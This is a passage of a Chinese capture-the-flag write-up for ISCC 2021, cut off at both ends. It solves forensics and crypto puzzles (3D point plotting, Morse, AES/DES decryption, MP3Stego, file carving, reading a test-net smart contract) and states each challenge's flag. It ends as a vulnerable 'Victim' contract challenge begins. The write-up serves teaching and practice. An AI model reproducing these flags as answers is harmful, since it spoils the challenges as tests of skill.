class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>百度找到的脚本，修改一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> mpl_toolkits.mplot3d <span class="hljs-keyword">import</span> Axes3D<br><br>fig = plt.figure()<br>ax = fig.gca(projection=<span class="hljs-string">&quot;3d&quot;</span>)<br><br><br>xs, ys ,zs= np.loadtxt(<span class="hljs-string">&#x27;xyz.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27;:&#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>ax.scatter(xs, ys, zs, zdir=<span class="hljs-string">&quot;z&quot;</span>, c=<span class="hljs-string">&quot;#FF5511&quot;</span>, marker=<span class="hljs-string">&quot;o&quot;</span>, s=<span class="hljs-number">40</span>)<br>ax.<span class="hljs-built_in">set</span>(xlabel=<span class="hljs-string">&quot;X&quot;</span>, ylabel=<span class="hljs-string">&quot;Y&quot;</span>, zlabel=<span class="hljs-string">&quot;Z&quot;</span>)<br><br>plt.show()<br></code></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/20210519181216709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>脚本2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> mpl_toolkits.mplot3d <span class="hljs-keyword">import</span> Axes3D<br>dot1 = [[<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>]]  <span class="hljs-comment"># 得到五个点</span><br>plt.figure()  <span class="hljs-comment"># 得到画面</span><br>ax1 = plt.axes(projection=<span class="hljs-string">&#x27;3d&#x27;</span>)<br>ax1.set_xlim(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>)  <span class="hljs-comment"># X轴，横向向右方向</span><br>ax1.set_ylim(<span class="hljs-number">15</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># Y轴,左向与X,Z轴互为垂直</span><br>ax1.set_zlim(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>)  <span class="hljs-comment"># 竖向为Z轴</span><br>color1 = [<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>]<br>marker1 = [<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>]<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> dot1:<br>    ax1.scatter(x[<span class="hljs-number">0</span>], x[<span class="hljs-number">1</span>], x[<span class="hljs-number">2</span>], c=color1[<span class="hljs-number">1</span>],<br>                marker=marker1[<span class="hljs-number">1</span>], linewidths=<span class="hljs-number">4</span>)  <span class="hljs-comment"># 用散点函数画点</span><br>    i += <span class="hljs-number">1</span><br>plt.show()<br><br></code></pre></td></tr></table></figure><p>运行得到<br><img src="https://img-blog.csdnimg.cn/20210518192536935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>密码口令是<code>365728</code>，解压压缩包，得到pdf文档<br><img src="https://img-blog.csdnimg.cn/2021050114193340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>摩斯密码解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CONGRATULATIONTHEFLAGICHALLENGEISCCTWOZEROTWOONE<br></code></pre></td></tr></table></figure><p>根据提示最终flag为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ISCC&#123;congratulationtheflagischallengeiscctwozerotwoone&#125;<br></code></pre></td></tr></table></figure><h3 id="海市蜃楼-1"><a href="#海市蜃楼-1" class="headerlink" title="海市蜃楼-1"></a>海市蜃楼-1</h3><blockquote><p>题目描述： 或许你看到的只是海市蜃楼…</p></blockquote><p>下载附件，是个docx文档，看到了压缩包文件头PK<br><img src="https://img-blog.csdnimg.cn/20210501112349328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改后缀为zip，解压，在document.xml文件中找到flag<br><img src="https://img-blog.csdnimg.cn/20210501112248789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法二：<br>使用winrar在文件中搜索ISCC字符串<br><img src="https://img-blog.csdnimg.cn/20210506222625824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h3><p>参考：<a href="https://terminalcats.com/0x41414141-ctf-blockchain-sanity-check-400/">https://terminalcats.com/0x41414141-ctf-blockchain-sanity-check-400/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">pragma solidity ^0.7.0;  // 指定所需的编译器版本<br>//SPDX-License-Identifier: UNLICENSED<br><br>contract look_look &#123;<br>    <span class="hljs-keyword">function</span> sloc111() public pure returns (string memory)&#123;    //public智能合约外部和内部都可使用的方法<br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;flag&#123;&#125;&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><br>合约地址: 0x0ed72dfd4c63dd97df8fec07e5a6bba466c6adf5<br></code></pre></td></tr></table></figure><p>需要挂代理，访问<a href="https://rinkeby.etherscan.io/">https://rinkeby.etherscan.io/</a></p><p>第一次做智能合约方面的题，输入合约地址，然后点击Contract<br><img src="https://img-blog.csdnimg.cn/2021050620485295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Decompile ByteCode，到这就卡住了<br><img src="https://img-blog.csdnimg.cn/20210506205053606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>星期天打了个比赛，里面也有个区块链题-<a href="https://www.anquanke.com/post/id/242237#h3-4">AZ</a>。公链明文泄露<br><img src="https://img-blog.csdnimg.cn/20210526141613891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选择UTF-8 查看,得到flag<br><img src="https://img-blog.csdnimg.cn/20210526141638578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="美人计"><a href="#美人计" class="headerlink" title="美人计"></a>美人计</h3><blockquote><p>题目描述：美人说的话里有解题提示，但是美人的话不能全信。</p></blockquote><p>我记得当时附件文档中有两个二维码，二维码内容还保存着，图片不见了，不知道怎么回事</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">第一个二维码：<br>U2FsdGVkX1/Ka+sScszwQkwhO+VLiJwV/<span class="hljs-number">6</span>IFg5W+TfNHGxG2qZsIr2iwMwb9X9Iu<br><span class="hljs-number">3</span>GuGWmPOtO27z8vNppD2D50fwsD+<span class="hljs-number">8</span>VWhdtW9J4cewYivH/Z/<span class="hljs-number">7</span>GoUvcJXJMrvf+vu<br>+CBqWDGp6HWd0e5whGhuzlK0ZtBcDZdPDSIHA7+GuUlifp8PcFCtJPgiuk143REE<br>+pKFiSJXolXLR1vJCdGY9w5mXFbiWPrb2U7r/v5noP8=<br><br>第二个二维码：<br>U2FsdGVkX19eOY/pDh8+vPAcvfkLi1XLUneVzjLLOMul53sKK8UpobdCOiPIv4KE<br></code></pre></td></tr></table></figure><p>图片属性给的提示，AES加密，密钥是ISCC2021</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">Try</span> AES, <span class="hljs-keyword">and</span> you will get the flag. ISCC2021<br></code></pre></td></tr></table></figure><p>对第一个二维码内容，解了三次AES加密得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">y0u_h@ve_fal1en_intO_tHe_tr@p_0f_tHe_be@uty_!<br></code></pre></td></tr></table></figure><p>第二个二维码内容，进行AES解密发现不行，然后尝试DES解密结果成功了，得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ISCC&#123;be@uty_1ike<span class="hljs-variable">$_Y0u_2O2lISCC</span>&#125;<br></code></pre></td></tr></table></figure><p>再复现的时候，附件中就剩一张二维码了，把docx后缀转换成zip解压，出题人变狗了，把第二张二维码藏在这了，和上面的方法一样，得到flag<br><img src="https://img-blog.csdnimg.cn/2021051320345497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="我的折扣是多少"><a href="#我的折扣是多少" class="headerlink" title="我的折扣是多少"></a>我的折扣是多少</h3><blockquote><p>题目描述：<br>小c同学去参加音乐会，在官网买票时发现了有提示消息，提供给的有“give_me_discount”的压缩包，好奇的小c下载下来，但却无从下手，为了节省零花钱，你能帮帮他吗？</p></blockquote><p>命令行运行give.exe，得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pass1&#123;\u006b\u0072\u0077&#125;<br></code></pre></td></tr></table></figure><p>把中间的进行unicode转码得到：pass1{krw}</p><p>010打开me.zip，在末尾发现Base编码<br><img src="https://img-blog.csdnimg.cn/20210501162644856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码得到：pass2{gcc666}</p><p>所以压缩包口令为krwgcc666，解压得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eW91Zm91bmRtZT8=<br></code></pre></td></tr></table></figure><p>base64解码</p><p><img src="https://img-blog.csdnimg.cn/20210501163008756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后使用MP3Stego</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">decode -X -P youfoundme? discount.mp3<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210501163051980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base32解码，最终flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCC&#123;Yourdiscount2.15&#125;<br></code></pre></td></tr></table></figure><h3 id="海市蜃楼-2"><a href="#海市蜃楼-2" class="headerlink" title="海市蜃楼-2"></a>海市蜃楼-2</h3><p>foremost分离图片，得到加密的压缩包</p><p>由于这是组合题，所以要在海市蜃楼-1中去找线索。最终发现true.xml有猫腻，原来是jpg文件<br><img src="https://img-blog.csdnimg.cn/20210526091711997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改为jpg<br><img src="https://img-blog.csdnimg.cn/20210526091822427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>海市蜃楼-1的flag也有猫腻，结合flag和图片，最终得到压缩包的口令为zhongnanshan，解压海市蜃楼-2的压缩包<br><img src="https://img-blog.csdnimg.cn/20210526092109814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫码得到一个网址，内容为<code>ZWFzeQ==</code>，base解码后为<code>easy</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://ctewm.com/aTvQcE/kva11w<br></code></pre></td></tr></table></figure><p>继续往下走，foremost分离图片得到压缩包，口令为easy</p><p><img src="https://img-blog.csdnimg.cn/20210526092546155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Hack-the-Victim"><a href="#Hack-the-Victim" class="headerlink" title="Hack the Victim"></a>Hack the Victim</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">Victim为含有漏洞的智能合约，在 Rinkeby测试网络的合约地址为：<br><span class="hljs-number">0x68D28fE315E6A344029D42915Fbc7af4261AB833</span><br>接口为：<br>contract Victim &#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-keyword">string</span> 